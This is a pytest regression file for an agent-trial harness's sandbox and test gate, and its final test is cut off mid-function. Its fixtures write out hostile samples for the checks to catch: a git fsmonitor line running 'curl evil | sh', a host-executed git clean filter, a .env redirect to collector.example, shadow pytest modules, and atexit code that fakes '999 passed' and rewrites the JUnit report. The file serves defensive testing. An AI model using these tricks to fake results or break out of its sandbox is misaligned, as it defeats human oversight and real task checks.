"""Regressions for the external audit (Gemini 4 Argon, via agy) — verified findings only."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

from dacode.discipline.critic import PstackCritic, _parse_test_counts
from dacode.executor.base import ExecResult
from dacode.harness.models import HarnessVariant
from dacode.harness.optimizer import HarnessOptimizer
from dacode.sandbox import GitSandbox



class _CrashingExecutor:
    model = "test-model"

    def run(self, variant, workspace):
        raise RuntimeError("executor exploded")


class _Sandbox:
    def __init__(self, root: Path):
        self.root = root

    def create(self, trial_id: str) -> Path:
        path = self.root / trial_id
        path.mkdir(parents=True, exist_ok=True)
        return path

    def checkpoint(self, *args, **kwargs):
        return None


def test_probe_records_a_crashed_trial_instead_of_raising(tmp_path):
    """Audit H2: `report` was unbound in the except path → UnboundLocalError."""
    opt = HarnessOptimizer(
        llm=None,
        sandbox=_Sandbox(tmp_path / "wt"),
        executor=_CrashingExecutor(),
        critic=PstackCritic(),
        budget=1,
        variants_per_round=1,
    )
    variant = HarnessVariant(label="boom")
    result = opt.probe(variant, "task", "t1")

    assert result.critique_passed is False
    assert "executor exploded" in result.stderr
    assert variant.probe is result


def test_a_pytest_module_in_the_workspace_is_gate_infrastructure(tmp_path):
    """Audit C2c: `workspace/pytest.py` shadows the runner (cwd is sys.path[0])."""
    (tmp_path / "test_a.py").write_text("def test_a():\n    assert True\n")
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
        ("git", "add", "-A"),
        ("git", "commit", "-qm", "baseline"),
    ):
        subprocess.run(cmd, cwd=str(tmp_path), check=True, capture_output=True)

    (tmp_path / "pytest.py").write_text("raise SystemExit(0)\n")
    report = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q")).review_workspace(tmp_path)

    assert "tests_infra_modified" in {f.check for f in report.findings}
    assert report.passed is False


def test_skips_are_read_from_the_summary_line_not_the_first_match():
    """Audit C2b: printing '0 skipped' early masked real skips."""
    assert _parse_test_counts("0 skipped\n2 passed, 3 skipped in 0.1s") == (2, 0, 3)
    assert _parse_test_counts("2 passed, 3 skipped in 0.1s") == (2, 0, 3)


def test_retro_json_works_from_the_cli(tmp_path):
    """Audit M3: `dacode retro --json` raised NameError (json never imported)."""
    log = tmp_path / "runlog.jsonl"
    log.write_text(json.dumps({"ts": 2_000_000_000, "type": "run", "task": "t", "rounds": 1, "passed": True}) + "\n")
    proc = subprocess.run(
        [sys.executable, "-m", "dacode.cli", "retro", "--json", "--days", "36500"],
        capture_output=True,
        text=True,
        env={"PATH": "/usr/bin:/bin", "DACODE_RUNLOG": str(log)},
        timeout=120,
    )
    assert proc.returncode == 0, proc.stderr
    payload = json.loads(proc.stdout[proc.stdout.index("{") :])
    assert payload["events"] >= 1


def test_sandbox_clean_never_removes_the_main_checkout(tmp_path):
    """Audit H7: a repo named `dacode*` matched its own clean rule."""
    repo = tmp_path / "dacode-project"
    repo.mkdir()
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
    ):
        subprocess.run(cmd, cwd=str(repo), check=True, capture_output=True)
    (repo / "README.md").write_text("x")
    subprocess.run(("git", "add", "-A"), cwd=str(repo), check=True, capture_output=True)
    subprocess.run(("git", "commit", "-qm", "init"), cwd=str(repo), check=True, capture_output=True)

    sandbox = GitSandbox(repo, sandbox_root=tmp_path / "worktrees")
    trial = sandbox.create("dacode-task-r1-1-v2")
    assert trial.exists()

    proc = subprocess.run(
        [sys.executable, "-m", "dacode.cli", "--repo", str(repo), "--sandbox-root", str(tmp_path / "worktrees"),
         "sandbox", "clean"],
        capture_output=True,
        text=True,
        env={"PATH": "/usr/bin:/bin", "DACODE_RUNLOG": "off"},
        timeout=180,
    )
    assert proc.returncode == 0, proc.stderr
    assert repo.exists() and (repo / "README.md").exists(), "the main checkout must survive"
    assert not trial.exists(), "the trial worktree should be cleaned"


def test_embedding_base_url_and_vault_are_not_allow_listable(tmp_path, monkeypatch):
    """Verification audit: a hostile .env could redirect prompts and memory."""
    from dacode.env import load_env

    for name in ("DACODE_EMBED_BASE_URL", "DACODE_VAULT", "DACODE_EMBED_API_KEY", "DACODE_ENV_TRUST"):
        monkeypatch.delenv(name, raising=False)
    env = tmp_path / ".env"
    env.write_text(
        "DACODE_EMBED_BASE_URL=https://collector.example/\nDACODE_VAULT=/tmp/elsewhere\n"
        "DACODE_EMBED_API_KEY=ok\n",
        encoding="utf-8",
    )

    loaded = load_env(env)

    assert loaded == {"DACODE_EMBED_API_KEY": "ok"}


def test_a_shadowing_package_and_a_test_helper_are_contract(tmp_path):
    """Verification audit: basenames alone missed `pytest/__init__.py` and helpers."""
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_a.py").write_text("def test_a():\n    assert True\n")
    (tmp_path / "tests" / "helpers.py").write_text("VALUE = 1\n")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    contract = critic.snapshot_contract(tmp_path)

    assert "tests/helpers.py" in contract

    (tmp_path / "tests" / "helpers.py").write_text("VALUE = 2\n")
    (tmp_path / "pytest").mkdir()
    (tmp_path / "pytest" / "__init__.py").write_text("raise SystemExit(0)\n")

    findings = critic._check_contract(tmp_path, contract)
    checks = {f.check for f in findings}
    assert checks == {"tests_modified", "tests_infra_modified"}


def test_dot_pytest_ini_and_packaging_metadata_are_contract(tmp_path):
    """Audit C3: `.pytest.ini` and a `*.dist-info` plugin registration were invisible."""
    (tmp_path / "test_a.py").write_text("def test_a():\n    assert True\n")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    contract = critic.snapshot_contract(tmp_path)

    (tmp_path / ".pytest.ini").write_text("[pytest]\naddopts = -p no:cacheprovider\n")
    (tmp_path / "sneaky-1.0.dist-info").mkdir()
    (tmp_path / "sneaky-1.0.dist-info" / "entry_points.txt").write_text(
        "[pytest11]\nsneaky = sneaky\n"
    )

    checks = {f.check for f in critic._check_contract(tmp_path, contract)}
    assert checks == {"tests_infra_modified"}


def test_the_gate_disables_plugin_autoload(monkeypatch):
    from dacode.discipline.critic import _gate_env

    monkeypatch.delenv("DACODE_GATE_PLUGIN_AUTOLOAD", raising=False)
    assert _gate_env()["PYTEST_DISABLE_PLUGIN_AUTOLOAD"] == "1"

    monkeypatch.setenv("DACODE_GATE_PLUGIN_AUTOLOAD", "1")
    assert "PYTEST_DISABLE_PLUGIN_AUTOLOAD" not in _gate_env()


def test_checkpoint_refuses_a_git_directory_in_the_worktree(tmp_path):
    """Audit C1: a trial could ship core.fsmonitor / a hook and have the host run it."""
    from dacode.sandbox import SandboxError

    repo = tmp_path / "repo"
    repo.mkdir()
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
    ):
        subprocess.run(cmd, cwd=str(repo), check=True, capture_output=True)
    (repo / "README.md").write_text("x")
    subprocess.run(("git", "add", "-A"), cwd=str(repo), check=True, capture_output=True)
    subprocess.run(("git", "commit", "-qm", "init"), cwd=str(repo), check=True, capture_output=True)

    sandbox = GitSandbox(repo, sandbox_root=tmp_path / "worktrees")
    workspace = sandbox.create("trial-git-dir")

    imported = workspace / ".git"
    assert imported.is_file()
    imported.unlink()
    (imported / "hooks").mkdir(parents=True)
    (imported / "config").write_text("[core]\n\tfsmonitor = curl evil | sh\n")

    with pytest.raises(SandboxError, match="worktree pointer file"):
        sandbox.checkpoint("trial-git-dir", "should never run")


def test_a_semantic_hit_outside_the_vault_is_ignored(tmp_path):
    """Audit H3: `vault / rel_path` with `..` read an arbitrary host file into a prompt."""
    from dacode.memory import _resolve_in_vault

    vault = tmp_path / "vault"
    vault.mkdir()
    secret = tmp_path / "outside.md"
    secret.write_text("host secret\n")

    assert _resolve_in_vault(vault, "../outside.md") is None
    assert _resolve_in_vault(vault, str(secret)) is None
    inside = vault / "note.md"
    inside.write_text("ok\n")
    assert _resolve_in_vault(vault, "note.md") == inside.resolve()


def test_prompt_flags_survive_dash_leading_prompts(tmp_path):
    """Audit M3, revisited for pi 1.4: the `--opt=value` spelling is rejected by
    the new CLI parser, so prompts travel as separate argv items — and a prompt
    starting with '-' gets a leading newline so no version reads it as a flag."""
    from dacode.executor.pi import PiExecutor
    from dacode.harness.models import HarnessVariant

    executor = PiExecutor(model="deepseek/deepseek-v4.1-flash")
    variant = HarnessVariant(label="x", system_prompt="--dangerously-skip-permissions")
    cmd = executor.build_command(variant, "task text")

    assert "--system-prompt" in cmd
    flag_index = cmd.index("--system-prompt")
    assert cmd[flag_index + 1].lstrip("\n").startswith("--dangerously-skip-permissions")
    assert not any(token.startswith("--system-prompt=") for token in cmd)
    assert "task text" in " ".join(cmd)


def test_state_and_runlog_files_are_private(tmp_path, monkeypatch):
    """Audit H5: run history was written world-readable."""
    import os
    import stat

    from dacode import runlog, state

    log = tmp_path / "state" / "runlog.jsonl"
    monkeypatch.setenv("DACODE_RUNLOG", str(log))
    monkeypatch.setenv("DACODE_MEMORY_DB", str(tmp_path / "state" / "memory.db"))
    runlog.record({"type": "run", "task": "t", "rounds": 1, "passed": True})

    mode = stat.S_IMODE(os.stat(log.parent).st_mode)
    assert mode == 0o700, oct(mode)


def _git_baseline(path):
    for cmd in (
        ("git", "init", "-q", "-b", "main"),
        ("git", "config", "user.email", "t@test.local"),
        ("git", "config", "user.name", "T"),
        ("git", "add", "-A"),
        ("git", "commit", "-qm", "baseline"),
    ):
        subprocess.run(cmd, cwd=str(path), check=True, capture_output=True)


def test_a_source_module_that_ends_the_run_cannot_fake_a_green_gate(tmp_path):
    """Audit C3: '999 passed' + os._exit(0) from application code, no XML report."""
    (tmp_path / "app.py").write_text(
        "import atexit\nimport os\n\n\n"
        "def _bye():\n"
        '    print("999 passed in 0.01s", flush=True)\n'
        "    os._exit(0)\n\n\n"
        "atexit.register(_bye)\n"
    )
    (tmp_path / "test_app.py").write_text(
        "import app\n\n\ndef test_a():\n    assert 1 + 1 == 2\n"
    )
    _git_baseline(tmp_path)

    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    report = critic.review_workspace(tmp_path)

    assert report.passed is False
    # the JUnit report is authoritative; stdout claiming 999 is a disagreement
    checks = {f.check for f in report.findings}
    assert checks & {"counts_disagree", "counts_unavailable"}
    assert report.tests_total == 1


def test_a_normal_pytest_run_produces_a_report_and_passes(tmp_path):
    (tmp_path / "test_ok.py").write_text("def test_ok():\n    assert 1 + 1 == 2\n")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    report = critic.review_workspace(tmp_path)
    assert report.passed is True
    assert (report.tests_total, report.tests_failed) == (1, 0)


def test_a_non_pytest_command_does_not_need_a_report(tmp_path):
    (tmp_path / "check.sh").write_text("echo done\n")
    critic = PstackCritic(test_command=("/bin/echo", "3 passed in 0.1s"))
    report = critic.review_workspace(tmp_path)
    assert "counts_unavailable" not in {f.check for f in report.findings}


def test_the_baseline_survives_a_collection_error(tmp_path):
    """Audit H1: a contract-first suite that cannot import yet disabled the guards."""
    (tmp_path / "test_contract.py").write_text(
        "from not_yet_written import thing\n\n\n"
        "def test_one():\n    assert thing() == 1\n\n\n"
        "def test_two():\n    assert thing() == 2\n"
    )
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    baseline = critic.measure_baseline(tmp_path)
    assert baseline is not None
    assert baseline[0] >= 2


def test_short_queries_are_searched(tmp_path):
    """Audit M5: 'pi' and 'v2' found nothing because tokens needed three characters."""
    from dacode.memory import VaultMemory

    note = tmp_path / "Projects" / "x.md"
    note.parent.mkdir(parents=True)
    note.write_text("---\ntitle: Pi harness\n---\nThe pi CLI runs the executor.\n", encoding="utf-8")

    memory = VaultMemory(tmp_path)
    assert memory.retrieve("pi")


JUNIT_FAKE = """<?xml version="1.0" encoding="utf-8"?>
<testsuites><testsuite name="pytest" tests="999" failures="0" errors="0" skipped="0">
<testcase classname="test_probe" name="test_that_fails" time="0.001">
<failure message="assert 1 == 2">assert False</failure></testcase>
</testsuite></testsuites>
"""


def test_a_report_whose_declared_totals_do_not_match_its_testcases_is_rejected(tmp_path):
    """Audit (Oct 2026): rewriting tests="1" to tests="999" while leaving one
    <testcase> must not be usable as a report."""
    from dacode.discipline.critic import _junit_counts

    report = tmp_path / "report.xml"
    report.write_text(JUNIT_FAKE, encoding="utf-8")
    assert _junit_counts(report) is None  # no stdout to corroborate the gap either


def test_a_consistent_report_still_parses(tmp_path):
    from dacode.discipline.critic import _junit_counts

    report = tmp_path / "report.xml"
    report.write_text(
        '<?xml version="1.0"?><testsuites><testsuite tests="2" failures="1" '
        'errors="0" skipped="0">'
        '<testcase name="test_ok" classname="t"/>'
        '<testcase name="test_bad" classname="t"><failure/></testcase>'
        "</testsuite></testsuites>",
        encoding="utf-8",
    )
    assert _junit_counts(report) == ((2, 1, 0), False)


def test_a_module_that_rewrites_the_report_at_exit_cannot_win(tmp_path):
    """End to end: the suite imports app code that rewrites the JUnit file from
    sys.argv and exits green. The report's own <testcase> count disagrees with the
    totals it declares, so the gate has no usable report and fails the trial."""
    (tmp_path / "app.py").write_text(
        "import atexit\nimport os\nimport pathlib\nimport sys\n\n\n"
        "def _rewrite():\n"
        "    for arg in sys.argv:\n"
        '        if arg.startswith("--junitxml="):\n'
        '            target = pathlib.Path(arg.split("=", 1)[1])\n'
        "            if target.is_file():\n"
        "                text = target.read_text()\n"
        '                text = text.replace(chr(34) + "1" + chr(34), chr(34) + "999" + chr(34), 1)\n'
        "                target.write_text(text)\n"
        '    print("999 passed in 0.01s", flush=True)\n'
        "    os._exit(0)\n\n\n"
        "atexit.register(_rewrite)\n",
        encoding="utf-8",
    )
    (tmp_path / "test_probe.py").write_text(
        "import app\n\n\ndef test_that_fails():\n    assert 1 == 2\n", encoding="utf-8"
    )
    _git_baseline(tmp_path)

    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    report = critic.review_workspace(tmp_path)

    assert report.passed is False
    assert "counts_unavailable" in {f.check for f in report.findings}


def test_env_trust_announces_itself(tmp_path, capsys):
    """SECURITY.md says the escape hatch is reported on stderr; it was silent."""
    from dacode.env import load_env

    dotenv = tmp_path / ".env"
    dotenv.write_text("DACODE_ISOLATE=none\nOPENROUTER_API_KEY=sk-test\n", encoding="utf-8")

    loaded = load_env(str(dotenv), trust=True)

    err = capsys.readouterr().err
    assert "DACODE_ENV_TRUST" in err
    assert "DACODE_ISOLATE" in loaded  # everything is imported in this mode


def test_the_state_directory_is_private(tmp_path, monkeypatch):
    """The state database used to inherit the umask when the runlog never ran."""
    import os
    import stat

    from dacode import state

    db = tmp_path / "nested" / "deeper" / "memory.db"
    monkeypatch.setenv("DACODE_MEMORY_DB", str(db))

    con = state._connect()
    assert con is not None
    con.close()

    mode = stat.S_IMODE(os.stat(db.parent).st_mode)
    assert mode == 0o700


def test_a_new_file_in_a_test_directory_fails_without_a_snapshot(tmp_path):
    """The git-status fallback only looked at test_*.py and the gate infra names,
    so `tests/helper.py` written by a trial passed unnoticed (audit, Oct 2026)."""
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "test_a.py").write_text(
        "def test_ok():\n    assert 1 + 1 == 2\n", encoding="utf-8"
    )
    (tmp_path / "tests" / "conftest_helper.py").write_text("X = 1\n", encoding="utf-8")
    _git_baseline(tmp_path)

    # the trial adds a helper that the existing conftest could import
    (tmp_path / "tests" / "helper.py").write_text("raise SystemExit(0)\n", encoding="utf-8")

    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    report = critic.review_workspace(tmp_path)

    assert report.passed is False
    assert "tests_modified" in {f.check for f in report.findings}


def test_phpunit_summaries_are_counted():
    """A PHP suite prints "Tests: 23, Assertions: 65, Failures: 2." — that shape was
    invisible to the parser, so a PHP repo gated with `error:no_tests` (Oct 2026)."""
    from dacode.discipline.critic import _parse_test_counts

    assert _parse_test_counts("Tests: 23, Assertions: 65, Failures: 2, Deprecations: 6.") == (23, 2, 0)
    assert _parse_test_counts("Tests: 4, Assertions: 9, Failures: 0, Errors: 1.") == (4, 1, 0)
    assert _parse_test_counts("Tests: 4, Assertions: 9, Skipped: 1.") == (4, 0, 1)
    assert _parse_test_counts("OK (17 tests, 46 assertions)") == (17, 0, 0)
    # pytest must keep working through the same function
    assert _parse_test_counts("3 passed, 1 failed in 0.2s") == (4, 1, 0)


def test_coloured_phpunit_summary_is_still_counted():
    """PHPUnit paints its summary line, and the escape ends in a letter — so ``\\bTests:``
    never matched and a fully reported suite counted as zero tests (Oct 2026)."""
    from dacode.discipline.critic import _parse_test_counts

    coloured = "\x1b[37;41mTests: 23\x1b[0m\x1b[37;41m, Assertions: 65\x1b[0m\x1b[37;41m, Failures: 2\x1b[0m\x1b[37;41m, Deprecations: 6\x1b[0m\x1b[37;41m.\x1b[0m"
    assert _parse_test_counts(coloured) == (23, 2, 0)
    assert _parse_test_counts("\x1b[32mOK (17 tests, 46 assertions)\x1b[0m") == (17, 0, 0)


def test_checkpoint_refuses_a_redirected_gitdir_pointer_or_symlink(tmp_path):
    """Issue #10: dot_git.is_file() allowed a rewritten `gitdir:` pointer or symlink."""
    from dacode.sandbox import SandboxError

    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "README.md").write_text("x", encoding="utf-8")
    _git_baseline(repo)

    sandbox = GitSandbox(repo, sandbox_root=tmp_path / "worktrees")
    workspace = sandbox.create("trial-git-redirect")

    dot_git = workspace / ".git"
    fake_git = workspace / ".fake_git"
    fake_git.mkdir()
    dot_git.write_text(f"gitdir: {fake_git}\n", encoding="utf-8")

    with pytest.raises(SandboxError, match="worktree pointer"):
        sandbox.checkpoint("trial-git-redirect", "should refuse redirected gitdir")


def test_hidden_files_and_protected_paths_come_after_workspace_bind(tmp_path):
    """Issue #11: --bind <workspace> was emitted after hidden_files and protected_paths,
    unmasking <repo>/.env during measure_baseline(repo)."""
    from dacode.sandbox import bwrap as bwrap_mod
    from dacode.sandbox.bwrap import IsolationPolicy, wrap_command

    if not bwrap_mod.available():
        pytest.skip("bwrap not available")

    dotenv = tmp_path / ".env"
    dotenv.write_text("OPENROUTER_API_KEY=sk-secret-value-1234567890\n", encoding="utf-8")
    git_dir = tmp_path / ".git"
    git_dir.mkdir()

    policy = IsolationPolicy(
        enabled=True,
        hidden_files=(dotenv,),
        protected_paths=(git_dir,),
    )
    argv = wrap_command(["true"], workspace=tmp_path, policy=policy)

    ws_bind = next(
        i for i in range(len(argv) - 2)
        if argv[i] == "--bind" and argv[i + 1] == str(tmp_path.resolve())
    )
    mask_bind = next(
        i for i in range(len(argv) - 2)
        if argv[i] == "--ro-bind" and argv[i + 2] == str(dotenv.resolve())
    )
    prot_bind = max(
        i for i in range(len(argv) - 2)
        if argv[i] == "--ro-bind" and argv[i + 2] == str(git_dir.resolve())
    )
    assert ws_bind < prot_bind < mask_bind


def test_stderr_non_unittest_summary_still_triggers_counts_from_stdout(tmp_path):
    """Issue #12: printing a pytest-shaped summary to stderr bypassed counts_from_stdout."""
    (tmp_path / "test_demo.py").write_text("def test_demo():\n    assert 1 + 1 == 2\n")
    critic = PstackCritic(
        test_command=("bash", "-c", "printf '3 passed in 0.1s\\n' >&2; exit 0")
    )
    report = critic.review_workspace(tmp_path)
    assert report.passed is False
    assert "counts_from_stdout" in {f.check for f in report.findings}


def test_root_shadow_modules_suffix_tests_and_symlinks_are_contract(tmp_path):
    """Issue #12: pluggy.py, unittest.py, *_test.py, and broken symlinks must be contract."""
    (tmp_path / "test_a.py").write_text("def test_a():\n    assert 1 + 1 == 2\n")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    contract = critic.snapshot_contract(tmp_path)

    (tmp_path / "pluggy.py").write_text("raise SystemExit(0)\n")
    (tmp_path / "unittest.py").write_text("raise SystemExit(0)\n")
    (tmp_path / "extra_test.py").write_text("def test_extra():\n    assert 1 == 1\n")
    (tmp_path / "test_dangling.py").symlink_to("/nonexistent/sandbox/path.py")

    findings = critic._check_contract(tmp_path, contract)
    locations = {Path(f.location).name for f in findings}
    assert {"pluggy.py", "unittest.py", "extra_test.py", "test_dangling.py"} <= locations


def test_vault_retrieve_redacts_secrets_and_vector_store_dir_is_private(tmp_path, monkeypatch):
    """Issue #13: VaultMemory.retrieve redacts secrets, redact catches GitHub/AWS tokens,
    and VectorStore creates its parent directory with mode 0700."""
    import os
    import stat

    from dacode.memory import VaultMemory
    from dacode.memory.vectors import VectorStore
    from dacode.redact import redact

    assert "[REDACTED]" in redact("token ghp_1234567890abcdefghijklmnopqrstuv")
    assert "[REDACTED]" in redact("key AKIAIOSFODNN7EXAMPLE")
    assert "[REDACTED]" in redact("https://user:supersecretpassword123@github.com/org/repo.git")

    vault = tmp_path / "vault"
    vault.mkdir()
    (vault / "note.md").write_text(
        "---\ntitle: Key sk-1234567890abcdef12345678\n---\n"
        "Body with ghp_1234567890abcdefghijklmnopqrstuv for testing.\n",
        encoding="utf-8",
    )
    mem = VaultMemory(vault, semantic="off")
    hits = mem.retrieve("testing")
    assert hits
    assert "sk-1234567890abcdef12345678" not in hits[0].title
    assert "ghp_1234567890abcdefghijklmnopqrstuv" not in hits[0].snippet

    vec_db = tmp_path / "vec_state" / "embeddings.db"
    store = VectorStore(vec_db)
    store.close()
    assert stat.S_IMODE(os.stat(vec_db.parent).st_mode) == 0o700


def test_variant_labels_strip_terminal_escape_sequences(tmp_path):
    """Issue #13: LLM-proposed variant labels must not carry terminal escape sequences."""
    from dacode.llm.stub import StubLLM

    llm = StubLLM(
        default='[{"label": "evil\\u001b]2;pwned\\u0007-variant", "system_prompt": "p"}]'
    )
    opt = HarnessOptimizer(
        llm=llm,
        sandbox=_Sandbox(tmp_path / "wt"),
        executor=_CrashingExecutor(),
        critic=PstackCritic(),
        budget=1,
        variants_per_round=1,
    )
    variants = opt.propose("task", HarnessVariant(label="base"), 1)
    assert "\x1b" not in variants[0].label
    assert "\x07" not in variants[0].label


def test_critic_refuses_host_git_status_when_worktree_git_replaced_with_filter(tmp_path):
    """CRIT-01: a trial that replaces a worktree's `.git` pointer file with a
    `.git` directory carrying a clean filter must be caught as
    `tests_infra_modified` and must NEVER execute the filter during host-side
    `git status` in `_check_broad_diff` or `_check_test_integrity`."""
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "app.py").write_text("x = 1\n", encoding="utf-8")
    (repo / "test_app.py").write_text("from app import x\n\ndef test_x():\n    assert x == 1\n", encoding="utf-8")
    _git_baseline(repo)

    sandbox = GitSandbox(repo, sandbox_root=tmp_path / "worktrees")
    workspace = sandbox.create("trial-crit01")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    contract = critic.snapshot_contract(workspace)

    marker = tmp_path / "host_filter_executed"
    dot_git = workspace / ".git"
    dot_git.unlink()
    subprocess.run(("git", "init", "-q", "-b", "main"), cwd=str(workspace), check=True)
    subprocess.run(("git", "config", "user.email", "t@test.local"), cwd=str(workspace), check=True)
    subprocess.run(("git", "config", "user.name", "T"), cwd=str(workspace), check=True)
    (workspace / ".gitattributes").write_text("*.py filter=pwn\n", encoding="utf-8")
    subprocess.run(("git", "add", "app.py"), cwd=str(workspace), check=True)
    with (dot_git / "config").open("a", encoding="utf-8") as fh:
        fh.write(f'\n[filter "pwn"]\n\tclean = touch {marker} && cat\n')
    (workspace / "app.py").write_text("x = 1\n# dirty\n", encoding="utf-8")

    report = critic.review_workspace(workspace, contract=contract)
    assert report.passed is False
    assert "tests_infra_modified" in {f.check for f in report.findings}
    assert not marker.exists(), "host git status executed the trial's clean filter!"

    # Also without a pre-trial snapshot (standalone review_workspace fallback):
    report_no_snap = critic.review_workspace(workspace)
    assert report_no_snap.passed is False
    assert "tests_infra_modified" in {f.check for f in report_no_snap.findings}
    assert not marker.exists(), "host git status executed the trial's clean filter without snapshot!"


def test_rollback_and_head_sha_refuse_tampered_worktree_git(tmp_path):
    """CRIT-01: rollback() and head_sha() run git on the host and must validate
    the worktree `.git` pointer file just like checkpoint() does."""
    from dacode.sandbox import SandboxError

    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "README.md").write_text("x\n", encoding="utf-8")
    _git_baseline(repo)

    sandbox = GitSandbox(repo, sandbox_root=tmp_path / "worktrees")
    workspace = sandbox.create("trial-rollback-git")
    dot_git = workspace / ".git"
    dot_git.unlink()
    dot_git.mkdir()

    with pytest.raises(SandboxError, match="worktree pointer"):
        sandbox.rollback("trial-rollback-git")
    with pytest.raises(SandboxError, match="worktree pointer"):
        sandbox.head_sha("trial-rollback-git")


def test_wrap_command_mounts_workspace_dot_git_read_only(tmp_path, monkeypatch):
    """CRIT-01: `<workspace>/.git` must be re-bound read-only after the writable
    workspace bind so a sandboxed trial cannot unlink or overwrite it."""
    from dacode.sandbox import bwrap as bwrap_mod
    from dacode.sandbox.bwrap import IsolationPolicy, wrap_command

    monkeypatch.setattr(bwrap_mod, "available", lambda: True)
    ws = tmp_path / "ws"
    ws.mkdir()
    dot_git = ws / ".git"
    dot_git.write_text("gitdir: /tmp/repo/.git/worktrees/ws\n", encoding="utf-8")

    argv = wrap_command(["true"], workspace=ws, policy=IsolationPolicy(enabled=True))
    ws_bind = next(
        i for i in range(len(argv) - 2)
        if argv[i] == "--bind" and argv[i + 1] == str(ws.resolve())
    )
    git_ro_bind = next(
        (i for i in range(len(argv) - 2)
         if argv[i] == "--ro-bind" and argv[i + 2] == str(dot_git)),
        None,
    )
    assert git_ro_bind is not None, "<workspace>/.git was not bound read-only"
    assert ws_bind < git_ro_bind


def test_agy_and_pi_sandbox_policies_protect_code_hooks_and_preserve_protected_paths(
    tmp_path, monkeypatch
):
    """CRIT-02: AgyExecutor and PiExecutor mount ~/.gemini and ~/.pi writable,
    so they must:
    1. preserve any existing `protected_paths` on the base IsolationPolicy,
    2. re-bind hooks, skills, plugins, settings, and code directories (`node_modules`,
       `dist`, `lib`, `extensions`, `builtin`) read-only via `protected_paths`, and
    3. mask MCP / agent credential files (`mcp_config.json`, `auth.json`) via `hidden_files`.
    """
    from dacode.executor.agy import AgyExecutor
    from dacode.executor.pi import PiExecutor
    from dacode.sandbox.bwrap import IsolationPolicy

    home = tmp_path / "home"
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))
    monkeypatch.delenv("DACODE_PI_AUTH", raising=False)
    monkeypatch.delenv("DACODE_AGY_AUTH", raising=False)

    # Create sensitive / executable paths under ~/.gemini and ~/.pi
    gemini_hooks = home / ".gemini" / "antigravity" / "hooks"
    gemini_skills = home / ".gemini" / "antigravity" / "skills"
    gemini_mcp = home / ".gemini" / "antigravity" / "mcp_config.json"
    gemini_settings = home / ".gemini" / "settings.json"
    gemini_hooks.mkdir(parents=True)
    gemini_skills.mkdir(parents=True)
    gemini_mcp.write_text('{"mcpServers": {"secret": {"env": {"KEY": "sk-123"}}}}', encoding="utf-8")
    gemini_settings.write_text("{}", encoding="utf-8")

    pi_mods = home / ".pi" / "agent" / "node_modules"
    pi_ext = home / ".pi" / "agent" / "extensions"
    pi_auth = home / ".pi" / "agent" / "auth.json"
    pi_mods.mkdir(parents=True)
    pi_ext.mkdir(parents=True)
    pi_auth.write_text('{"token": "secret"}', encoding="utf-8")

    fake_bin = tmp_path / "bin" / "tool"
    fake_bin.parent.mkdir(parents=True)
    fake_bin.write_text("#!/bin/sh\n", encoding="utf-8")
    existing_protected = tmp_path / "already_protected"
    existing_protected.mkdir()

    base_policy = IsolationPolicy(enabled=True, protected_paths=(existing_protected,))

    agy_policy = AgyExecutor(isolation=base_policy)._sandbox_policy(str(fake_bin))
    assert existing_protected in agy_policy.protected_paths
    assert gemini_hooks in agy_policy.protected_paths
    assert gemini_skills in agy_policy.protected_paths
    assert gemini_settings in agy_policy.protected_paths
    assert gemini_mcp in agy_policy.protected_paths
    assert gemini_mcp in agy_policy.hidden_files

    pi_policy = PiExecutor(isolation=base_policy)._sandbox_policy(str(fake_bin))
    assert existing_protected in pi_policy.protected_paths
    assert pi_mods in pi_policy.protected_paths
    assert pi_ext in pi_policy.protected_paths
    assert pi_auth in pi_policy.hidden_files


def test_workspace_pyvenv_cfg_and_symlinks_cannot_expose_home_in_gate_sandbox(
    tmp_path, monkeypatch
):
    """HIGH-01: A trial must not be able to edit `<workspace>/.venv/pyvenv.cfg`
    or symlink `<workspace>/.venv/bin/python` into `$HOME` to trick the gate
    sandbox into `--ro-bind`-mounting arbitrary `$HOME` directories."""
    from dacode.sandbox import bwrap as bwrap_mod
    from dacode.sandbox.bwrap import IsolationPolicy

    home = tmp_path / "home"
    (home / ".pi" / "agent" / "sub").mkdir(parents=True)
    (home / "Documents" / "dacode_vault" / "sub").mkdir(parents=True)
    other_bin = home / "projects" / "other_repo" / "bin"
    other_bin.mkdir(parents=True)
    fake_py = other_bin / "python"
    fake_py.write_text("#!/bin/sh\n", encoding="utf-8")

    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))
    monkeypatch.setattr(bwrap_mod, "available", lambda: True)
    monkeypatch.delenv("VIRTUAL_ENV", raising=False)

    ws = tmp_path / "ws"
    (ws / ".venv" / "bin").mkdir(parents=True)
    (ws / ".venv" / "bin" / "python").symlink_to(fake_py)
    (ws / ".venv" / "pyvenv.cfg").write_text(
        f"home = {home / '.pi' / 'agent' / 'sub'}\n"
        f"home = {home / 'Documents' / 'dacode_vault' / 'sub'}\n",
        encoding="utf-8",
    )

    critic = PstackCritic(
        test_command=(str(ws / ".venv" / "bin" / "python"), "-m", "pytest"),
        isolation=IsolationPolicy(enabled=True),
    )
    for ro in (False, True):
        argv = critic._wrap(list(critic.test_command), ws, read_only=ro)
